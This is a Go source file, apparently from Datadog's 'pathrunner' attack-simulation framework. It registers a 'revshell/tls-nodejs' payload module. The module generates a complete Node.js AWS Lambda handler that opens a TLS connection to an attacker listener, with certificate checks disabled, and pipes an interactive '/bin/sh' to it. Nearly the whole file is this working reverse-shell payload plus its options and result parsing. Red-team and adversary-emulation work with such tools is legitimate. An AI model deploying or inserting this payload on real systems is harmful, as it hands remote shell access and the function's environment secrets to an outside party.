// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package lambda

import (
	"encoding/json"
	"fmt"
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
	"strings"
)

// RevshellTLSNodejsPayload establishes a TLS reverse shell from a Node.js Lambda function.
// Uses Node.js built-in tls and child_process modules — no external dependencies needed.
// Requires a TLS listener (attacker listener start) and a long function timeout (900s max).
type RevshellTLSNodejsPayload struct{}

func init() {
	_ = payloads.Register(&RevshellTLSNodejsPayload{})
}

func (p *RevshellTLSNodejsPayload) GetName() string {
	return "revshell/tls-nodejs"
}

func (p *RevshellTLSNodejsPayload) GetDescription() string {
	return "Establish a TLS reverse shell from a Node.js Lambda function to an attacker listener"
}

func (p *RevshellTLSNodejsPayload) GetTags() []string {
	return []string{
		payloads.TagServiceLambda,
		payloads.TagLanguageNodeJS,
		payloads.TagTechniqueAccess,
		payloads.TagTransportHTTPS,
	}
}

func (p *RevshellTLSNodejsPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "LISTENER_IP",
			Description: "Attacker IP address running the TLS listener",
			Required:    true,
		},
		{
			Name:        "LISTENER_PORT",
			Description: "Attacker port for the TLS listener",
			Required:    false,
			Default:     "4444",
		},
	}
}

func (p *RevshellTLSNodejsPayload) Validate(options map[string]string) error {
	if options["LISTENER_IP"] == "" {
		return fmt.Errorf("LISTENER_IP is required for revshell/tls-nodejs payload")
	}
	// Prevent single-quote injection into generated JS string literals
	if strings.ContainsAny(options["LISTENER_IP"], "'") {
		return fmt.Errorf("LISTENER_IP must not contain single quotes")
	}
	if port := options["LISTENER_PORT"]; port != "" && strings.ContainsAny(port, "'") {
		return fmt.Errorf("LISTENER_PORT must not contain single quotes")
	}
	return nil
}

func (p *RevshellTLSNodejsPayload) GenerateCode(options map[string]string) (string, error) {
	code := `'use strict';

exports.handler = (event, context) => {
  // Disable Lambda function timeout so the shell session can persist
  context.callbackWaitsForEmptyEventLoop = false;

  const tls = require('tls');
  const { spawn } = require('child_process');

  const lhost = process.env.LISTENER_IP || '';
  const lport = parseInt(process.env.LISTENER_PORT || '4444', 10);

  return new Promise((resolve) => {
    const conn = tls.connect(
      { host: lhost, port: lport, rejectUnauthorized: false },
      () => {
        const sh = spawn('/bin/sh', ['-i'], {
          env: process.env,
          stdio: ['pipe', 'pipe', 'pipe'],
        });

        conn.pipe(sh.stdin);
        sh.stdout.pipe(conn);
        sh.stderr.pipe(conn);

        sh.on('close', () => {
          conn.destroy();
          resolve({ statusCode: 200, body: 'Shell session ended' });
        });

        sh.on('error', (err) => {
          conn.destroy();
          resolve({ statusCode: 500, body: 'Shell error: ' + err.message });
        });
      }
    );

    conn.on('error', (err) => {
      resolve({ statusCode: 500, body: 'TLS connection failed: ' + err.message });
    });
  });
};
`
	return code, nil
}

func (p *RevshellTLSNodejsPayload) ProcessResult(result string) (string, error) {
	var lambdaResponse map[string]interface{}
	if err := json.Unmarshal([]byte(result), &lambdaResponse); err != nil {
		return result, nil
	}

	body, _ := lambdaResponse["body"].(string)
	if body == "" {
		return result, nil
	}
	return body + "\n", nil
}
